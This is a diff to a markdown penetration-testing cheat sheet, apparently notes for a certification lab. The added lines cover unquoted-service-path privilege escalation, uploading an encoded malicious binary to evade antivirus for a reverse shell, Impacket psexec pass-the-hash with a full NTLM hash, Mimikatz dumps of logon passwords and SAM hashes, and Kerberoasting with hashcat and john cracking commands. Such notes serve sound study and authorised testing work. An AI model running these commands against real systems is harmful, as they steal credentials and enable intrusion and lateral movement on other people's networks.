@@ -1419,6 +1419,8 @@ searchsploit -t Apache | grep -v '/dos/'
 ```
 
 ## Reverse Shells
+https://www.revshells.com/
+
 ***escape quotes if running from command line*** (ex., ((\"192.168.49.232\",80)))
 ```bash
 # Linux
@@ -1851,6 +1853,22 @@ net users
 net user user1
 net localgroups
 
+Unquoted Service Path:
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+
+icacs “C:\Program Files”   #Check for folder/file permissions
+
+F = Full Control
+CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.
+OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE
+
+sc qc <service>  #Checking for Auto start and owner of service
+
+Upload malicious encoded binary in controlled folder to bypass AV  #Reverse Shell
+
+sc stop <service> OR shutdown /r /t 0   #If user has rights and sc stop is now granted
+
+
 accesschk:
 -u: Suppress the errors
 
@@ -2074,7 +2092,7 @@ nc -lvnp 8080 > win_rev.doc   #To kali box
 
 ```bash
 # Attack machine
-python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"
+python3 /usr/share/impacket/impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"
 
 	# Or SMB service
 	# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
@@ -2178,6 +2196,9 @@ evil-winrm  -i 192.168.1.100 -u Administrator -H 'MySuperSecr3tPass123!' -s '/ho
 
 evil-winrm  -i 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae974876d974abd805a989ebead86846 -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
 
+## Impacket-PSexec:
+
+python3 /usr/share/impacket/impacket/examples/psexec.py "Administrator":@10.11.1.121 -hashes aad3b435b51404eeaad3b435b51404ee:57321e6a0eef2c45985c9fa49c5cd24f #upload/download files with shell access
 
 
 msf5 > use exploit/windows/smb/psexec
@@ -2352,9 +2373,41 @@ SharpHound for local Active Directory # run the collector on the machine using S
 
 ```
 ### Mimikatz Commands
-
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a  #Kerberoasting Cheatsheet
 ```
-Add commands to grab tickets and passwords for cracking & passing
+privilege::debug  #Check Architecture for for correct mimikatz version
+
+sekurlsa::logonpasswords  #Dump cached passwords from logins
+
+lsadump::sam #Dumps passwords/hashes in sam file
+
+## Invoke-Mimikatz
+Invoke-Mimikatz -DumpCreds -ComputerName XOR-APP59  
+
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+
+## Ticket Grabbing
+sekurlsa::tickets  #Run with mimikatz
+
+PS C:\Users\Public\Documents> klist  #klist dumps tickets in powershell
+
+#Invoke-Kerberoast.ps1 to dump tickets:
+
+Import-Module .\Invoke-Kerberoast.ps1
+
+Next type: PS C:\Users\Public> Invoke-Kerberoast.ps1
+
+#Grabbing ticket hashes for hashcat:
+
+Invoke-Kerberoast -OutputFormat Hashcat | % {$_.Hash} | Out-File -Encoding ascii hashes.hashcat
+
+hashcat -m 13100 -a 0 -o cracked.txt hashes.hashcat /home/kali/rockyou.txt  ##Use SMBserver to transfer hashes
+
+# Grabbing tickets for john:
+
+PS C:\Tools\active_directory> Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
+
+sudo john --format=krb5tgs hash.txt --wordlist=/home/kali/rockyou.txt  #Use SMBserver to transfer hashes 
 
 ```
 
@@ -2464,6 +2517,8 @@ echo $GDMSESSION
 ### Proof
 ```
 hostname && whoami.exe && type proof.txt && ipconfig /all
+
+PS C:\Users\administrator.xor\Desktop> hostname; whoami.exe; type proof.txt; ipconfig /all
 ```
 
 ### Passwords and hashes
